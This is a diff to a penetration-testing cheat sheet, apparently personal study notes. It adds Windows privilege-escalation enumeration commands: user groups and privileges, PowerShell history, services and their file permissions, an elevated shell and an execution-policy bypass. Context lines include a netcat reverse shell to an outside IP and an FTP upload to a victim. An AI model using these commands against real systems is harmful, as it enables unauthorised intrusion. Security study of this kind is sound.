@@ -3,6 +3,10 @@
 
 File extensions to search for:   `*.txt, *.pdf, *.ini, *.doc, *.docx, *.xls, *.xlsx`
 
+##### Reboot system
+```powershell
+shutdown /r /t 0
+```
 ##### Use active mode, binary transfer, put .exe on Linux
 ```bash
 ftp <victim_IP>
@@ -96,6 +100,15 @@ nc -e /bin/sh 10.0.0.1 1234
 Get-LocalUser
 ```
 
+##### Get user's groups
+```powershell
+whoami /groups
+```
+##### Get user's privileges
+```powershell
+whoami /priv
+```
+
 ##### Get existing groups on a machine
 ```powershell
 Get-LocalGroup
@@ -103,16 +116,17 @@ Get-LocalGroup
 
 ##### Get members of a specific group
 ```powershell
-Get-LocalGroupMemeber <group>
+Get-LocalGroupMember <group>
 ```
 
 ##### Get user's PS history
 ```powershell
+# PS history
 Get-History
 
+# PSReadline
 (Get-PSReadlineOption).HistorySavePath
 ```
-
 
 ##### Query registry keys to list applications
 ```powershell
@@ -126,6 +140,33 @@ Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
 ##### Get list of running programs
 ```powershell
 Get-Process
+```
+
+##### Get list of installed services
+```powershell
+# Must be RDP'd in (Perm Denied error with shells)
+Get-Service
+
+# Running services only
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+# Running services *not* in C:\windows\system32
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}
+
+# GUI
+services.msc
+```
+
+##### Get user who started service
+```powershell
+Get-CimInstance -ClassName win32_service -Filter "name='BackupMonitor'" | select StartName
+```
+
+##### Enumerate file permissions
+```powershell
+icacls "c:\xampp\mysql\bin\mysqld.exe"
+
+Get-ACL "c:\xampp\mysql\bin\mysqld.exe"
 ```
 
 ##### Find file recursively
@@ -159,6 +200,15 @@ runAs /user:<user> <command>
 	Attempting to start <command> as user "<domain>\<user>" ...
 ```
 
+##### Cmdline for opening up PowerShell with 'run as Admin' (PS terminal with High vs Medium Mandatory level)
+```powershell
+Start-Process powershell.exe -Verb runAs
+```
+
+##### Set ExecutionPolicy to Bypass
+```powershell
+powershell -ep bypass
+```
 
 # OSINT
 
